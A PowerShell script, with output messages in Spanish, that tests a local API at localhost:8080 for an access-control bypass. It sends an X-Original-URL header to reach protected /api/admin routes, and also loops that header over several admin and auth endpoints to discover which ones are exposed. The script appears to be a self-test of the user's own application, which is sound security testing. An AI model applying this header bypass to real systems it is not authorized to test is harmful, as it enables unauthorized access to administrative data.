Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "PRUEBA INTERACTIVA: Bypass 403 - Ver Datos Reales" -ForegroundColor Cyan
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

# Función para hacer peticiones y mostrar resultados
function Test-Endpoint {
    param(
        [string]$Name,
        [string]$Url,
        [hashtable]$Headers = @{},
        [string]$Color = "White"
    )
    
    Write-Host "[$Name]" -ForegroundColor $Color
    Write-Host "URL: $Url" -ForegroundColor Gray
    if ($Headers.Count -gt 0) {
        Write-Host "Headers: $($Headers.Keys | ForEach-Object { "$_`: $($Headers[$_])" })" -ForegroundColor Magenta
    }
    Write-Host "----------------------------------------" -ForegroundColor Gray
    
    try {
        $response = Invoke-WebRequest -Uri $Url -Headers $Headers -Method GET -UseBasicParsing
        $contentType = $response.Headers.'Content-Type'
        
        Write-Host "✓ Status: $($response.StatusCode)" -ForegroundColor Green
        Write-Host "✓ Content-Type: $contentType" -ForegroundColor Green
        
        # Determinar si es JSON o HTML
        if ($contentType -like "*json*") {
            Write-Host "✓ Tipo: JSON (Datos de API)" -ForegroundColor Cyan
            $json = $response.Content | ConvertFrom-Json
            Write-Host "Datos recibidos:" -ForegroundColor Yellow
            $response.Content | ConvertFrom-Json | ConvertTo-Json -Depth 3 | Write-Host -ForegroundColor White
        }
        elseif ($contentType -like "*html*") {
            Write-Host "⚠ Tipo: HTML (Frontend)" -ForegroundColor Yellow
            Write-Host "Es el frontend de React/Vite, no datos de API" -ForegroundColor Gray
        }
        else {
            Write-Host "Respuesta:" -ForegroundColor White
            Write-Host $response.Content.Substring(0, [Math]::Min(500, $response.Content.Length)) -ForegroundColor Gray
        }
    }
    catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        Write-Host "✗ Status: $statusCode" -ForegroundColor Red
        Write-Host "✗ Error: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    Write-Host ""
    Write-Host ""
}

Write-Host "Vamos a probar diferentes endpoints de tu API..." -ForegroundColor Yellow
Write-Host ""
Start-Sleep -Seconds 2

# Test 1: Acceso directo a /api/tests (público)
Test-Endpoint -Name "TEST 1: Acceso normal a /api/tests (público)" `
              -Url "http://localhost:8080/api/tests" `
              -Color "Cyan"

# Test 2: Acceso a /api/admin/tests (requiere autenticación)
Test-Endpoint -Name "TEST 2: Acceso normal a /api/admin/tests (protegido)" `
              -Url "http://localhost:8080/api/admin/tests" `
              -Color "Yellow"

# Test 3: Bypass a /api/admin/tests
Test-Endpoint -Name "TEST 3: BYPASS a /api/admin/tests usando X-Original-URL" `
              -Url "http://localhost:8080/" `
              -Headers @{"X-Original-URL" = "/api/admin/tests"} `
              -Color "Red"

Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "Probando otros endpoints protegidos..." -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""

# Test 4: Intentar POST sin bypass
Write-Host "[TEST 4: POST a /api/admin/tests sin bypass]" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray
try {
    $response = Invoke-WebRequest -Uri "http://localhost:8080/api/admin/tests" -Method POST -UseBasicParsing
    Write-Host "✓ Status: $($response.StatusCode)" -ForegroundColor Green
}
catch {
    Write-Host "✗ Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
    Write-Host "✗ Como esperado - requiere autenticación" -ForegroundColor Gray
}
Write-Host ""
Write-Host ""

# Test 5: Verificar si podemos hacer GET con autenticación falsa
Write-Host "[TEST 5: Intentar acceder con token falso]" -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Gray
try {
    $fakeHeaders = @{
        "Authorization" = "Bearer fake-token-12345"
    }
    $response = Invoke-WebRequest -Uri "http://localhost:8080/api/admin/tests" -Headers $fakeHeaders -Method GET -UseBasicParsing
    Write-Host "✓ Status: $($response.StatusCode)" -ForegroundColor Green
    Write-Host "Contenido: $($response.Content)" -ForegroundColor White
}
catch {
    Write-Host "✗ Status: $($_.Exception.Response.StatusCode.value__)" -ForegroundColor Red
    Write-Host "✗ Token inválido rechazado (correcto)" -ForegroundColor Gray
}
Write-Host ""
Write-Host ""

# Test 6: Listar todos los endpoints disponibles
Write-Host "TEST 6: Descubrir endpoints con bypass" -ForegroundColor Cyan
Write-Host "----------------------------------------" -ForegroundColor Gray
Write-Host "Probando diferentes rutas con X-Original-URL..." -ForegroundColor White
Write-Host ""

$endpoints = @(
    "/api/auth/login",
    "/api/auth/register",
    "/api/tests",
    "/api/admin",
    "/api/admin/users",
    "/api/admin/tests"
)

foreach ($endpoint in $endpoints) {
    try {
        $headers = @{"X-Original-URL" = $endpoint}
        $response = Invoke-WebRequest -Uri "http://localhost:8080/" -Headers $headers -Method GET -UseBasicParsing -TimeoutSec 3
        $contentType = $response.Headers.'Content-Type'
        
        if ($contentType -like "*json*") {
            Write-Host "  ✓ $endpoint - Status: $($response.StatusCode) (JSON)" -ForegroundColor Green
        }
        else {
            Write-Host "  ○ $endpoint - Status: $($response.StatusCode) (HTML)" -ForegroundColor Gray
        }
    }
    catch {
        $status = $_.Exception.Response.StatusCode.value__
        if ($status) {
            Write-Host "  ✗ $endpoint - Status: $status" -ForegroundColor Red
        }
        else {
            Write-Host "  ? $endpoint - Error de conexión" -ForegroundColor DarkGray
        }
    }
}

Write-Host ""
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host "CONCLUSIONES:" -ForegroundColor Yellow
Write-Host "================================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "VULNERABILIDAD CONFIRMADA SI:" -ForegroundColor Red
Write-Host "   - El TEST 2 falla con 401 o 403" -ForegroundColor White
Write-Host "   - El TEST 3 funciona con 200 OK y devuelve JSON" -ForegroundColor White
Write-Host "   - Esto significa que el header X-Original-URL bypasea la seguridad" -ForegroundColor White
Write-Host ""
Write-Host "NOTA:" -ForegroundColor Yellow
Write-Host "   Si ves HTML en lugar de JSON, es porque el endpoint" -ForegroundColor White
Write-Host "   está redirigiendo al frontend o no existe." -ForegroundColor White
Write-Host "   Busca los endpoints que devuelven JSON en los tests." -ForegroundColor White
Write-Host ""

Read-Host "Presiona Enter para salir"
